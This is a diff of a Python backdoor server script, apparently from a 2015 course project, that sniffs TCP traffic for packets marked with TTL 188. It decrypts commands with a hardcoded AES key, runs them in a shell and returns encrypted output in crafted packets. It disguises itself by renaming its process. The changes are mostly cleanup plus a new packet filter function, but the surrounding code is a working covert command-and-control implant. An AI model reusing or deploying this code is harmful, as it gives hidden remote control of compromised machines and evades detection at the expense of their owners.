@@ -4,8 +4,8 @@
 --  PROGRAM:        Receives the command from the client, executes it and returns
 --                  the output back to the client.
 --
---  FUNCTIONS:      encryptData(data), 
---                  decryptData(data), 
+--  FUNCTIONS:      encryptData(data),
+--                  decryptData(data),
 --                  getCommand(packet).
 --
 --  DATE:           October 9, 2015
@@ -23,7 +23,7 @@
 
 #!/usr/bin/python
 from scapy.all import *
-import logging
+#import logging
 import subprocess
 import setproctitle
 import argparse
@@ -50,7 +50,7 @@ args = cmdParser.parse_args();
 --  Description:
 --      Function to encrypt the passed in data string using AES with the specified
 --      encryption key and salt value.
-'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''  
+'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
 def encryptData(data):
     #Both key and salt values have to be 16 bytes due to the way AES encryption works.
     key = "JustinTom 8505A3"
@@ -73,7 +73,7 @@ def encryptData(data):
 --  Description:
 --      Function to decrypt the passed in data string using AES with the specified
 --      decryption key and salt value.
-'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''  
+'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
 def decryptData(data):
     #Both key and salt values have to be 16 bytes due to the way AES encryption works.
     key = "JustinTom 8505A3"
@@ -94,18 +94,19 @@ def decryptData(data):
 --      None.
 --  Description:
 --      Function to parse the packet object from the scapy sniff of the network
---      traffic going to the terminal and filter it further to ensure it is the 
---      packet we are looking for from the compromised server. It will then 
+--      traffic going to the terminal and filter it further to ensure it is the
+--      packet we are looking for from the compromised server. It will then
 --      decrypt the extracted command sent from the client. After executing that
 --      command, pipe the output to be encrypted and sent back the client.
-'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''  
+'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
 def getCommand(packet):
-    if IP in packet[0] and Raw in packet[2]:
+    if IP in packet[0]:
         ttl = packet[IP].ttl
-        srcIPAddr = packet[IP].src
         #Confirm the filter - double check that the data is coming from the expected address.
         if ttl == 188:
             destPort = packet[TCP].dport
+            srcIPAddr = packet[IP].src
+            dstIPAddr = packet[IP].dst
             #Decrypt the extracted command from the raw layer.
             command = decryptData(packet[Raw].load)
             #Pipe the command to a shell subprocess to receive the output
@@ -123,12 +124,36 @@ def getCommand(packet):
             craftedPacket = IP(dst=srcIPAddr, ttl=188)/TCP(dport=destPort)/Raw(load=encryptedOutput)
             send(craftedPacket, verbose=0)
 
+'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
+--  FUNCTION
+--  Name:       packetCheck
+--  Parameters:
+--      packet
+--          The packet object that is sniffed with scapy.
+--  Return Values:
+--      True
+--          If the packet is the right one we're expecting.
+--      False
+--          If the packet is not the right one we're expecting.
+--  Description:
+--      Function to check if the packet we sniffed is the right one by filtering it
+--      by the values we've put in our crafter packets. Returns true or false.
+'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
+def packetCheck(packet):
+    if IP in packet[0] and Raw in packet[2]:
+        ttl = packet[IP].ttl
+        srcIP = packet[IP].src
+        if ttl == 188:
+            return True
+    else:
+        return False
+
 if __name__ == "__main__":
     #Immediately rename the process to the specified name.
     setproctitle.setproctitle(args.procName)
     #Prevent scapy from printing out anything but errors to the terminal.
-    logging.getLogger("scapy.runtime").setLevel(Logging.ERROR)
+    #logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
     #Sniff for the TCP traffic for packets with TTL of 188 (key identifier)
     #If those conditions are true, then run the getCommand method.
     while True:
-        sniff(filter="tcp", prn=getCommand)
+        sniff(filter="tcp", prn=getCommand, stop_filter=packetCheck)
